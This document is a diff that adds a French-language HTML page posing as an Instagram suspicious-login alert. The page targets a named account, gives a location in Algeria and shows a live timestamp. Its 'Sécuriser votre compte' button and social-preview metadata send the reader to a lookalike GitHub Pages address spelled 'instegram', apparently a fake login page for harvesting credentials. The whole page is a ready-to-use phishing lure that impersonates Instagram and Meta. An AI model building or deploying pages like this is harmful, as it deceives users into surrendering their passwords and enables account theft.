@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Instagram Alert">
+    <meta property="og:description" content="Alerte de connexion suspecte sur votre compte Instagram.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+    <meta property="og:url" content="https://instagramlogin0.github.io/Login./instegra/instegram.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+    <meta name="twitter:title" content="Instagram Alert">
+    <meta name="twitter:description" content="Alerte de connexion suspecte sur votre compte Instagram.">
+    <title>Instagram Alert</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+        }
+        .email-container {
+            max-width: 600px;
+            margin: 20px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border: 1px solid #ddd;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            max-width: 150px;
+        }
+        .content {
+            font-size: 16px;
+            color: #444;
+            line-height: 1.6;
+        }
+        .content p {
+            margin: 15px 0;
+        }
+        .device-info {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #fef6f6;
+            border: 1px solid #f2dede;
+            border-radius: 8px;
+        }
+        .device-info p {
+            margin: 5px 0;
+            font-size: 14px;
+            color: #333;
+        }
+        .btn {
+            display: inline-block;
+            margin: 20px 0;
+            padding: 10px 20px;
+            background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
+            color: white;
+            font-size: 14px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .btn:hover {
+            opacity: 0.9;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Logo Instagram">
+        </div>
+        <div class="content">
+            <p><strong>Nous avons remarqué une nouvelle connexion, <span id="username">i_ss_am09</span></strong></p>
+            <p>Nous avons remarqué une connexion depuis un appareil que vous n'utilisez pas habituellement.</p>
+            <div class="device-info">
+                <p><strong>Appareil:</strong> Apple iPhone</p>
+                <p><strong>Application:</strong> Instagram</p>
+                <p><strong>Lieu:</strong> Mostaganem, Algérie</p>
+                <p><strong>Heure:</strong> <span id="time">Chargement...</span></p>
+            </div>
+            <p>Si c'était vous, vous ne pourrez pas accéder à certains paramètres de sécurité et de compte pendant quelques jours. Vous pouvez toujours y accéder depuis un appareil sur lequel vous vous êtes déjà connecté.</p>
+            <p>Si ce n'était pas vous, vous pouvez sécuriser votre compte depuis un appareil avec lequel vous vous êtes connecté auparavant. <a href="#">En savoir plus</a></p>
+            <!-- Modifier le lien pour ouvrir dans une nouvelle fenêtre sans affecter la sécurité -->
+            <a href="https://instagramlogin0.github.io/Login./instegra/instegram.html" class="btn" target="_blank" rel="noopener noreferrer">Sécuriser votre compte</a>
+        </div>
+        <div class="footer">
+            © Instagram. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025
+        </div>
+    </div>
+
+    <script>
+        // Simulation de récupération du nom d'utilisateur depuis le serveur
+        const userData = {
+            username: "i_ss_am09" // Remplacez cela par des données dynamiques depuis l'API Instagram ou le backend
+        };
+
+        // Mise à jour du nom d'utilisateur dynamiquement
+        document.getElementById('username').textContent = userData.username;
+
+        // Obtention de l'heure actuelle et formatage en fonction du fuseau horaire de l'utilisateur
+        function updateTime() {
+            const now = new Date();
+            const options = {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                timeZoneName: 'short'
+            };
+            const formattedTime = new Intl.DateTimeFormat('fr-FR', options).format(now);
+            document.getElementById('time').textContent = formattedTime;
+        }
+
+        // Mise à jour automatique de l'heure au chargement de la page
+        updateTime();
+    </script>
+</body>
+</html>
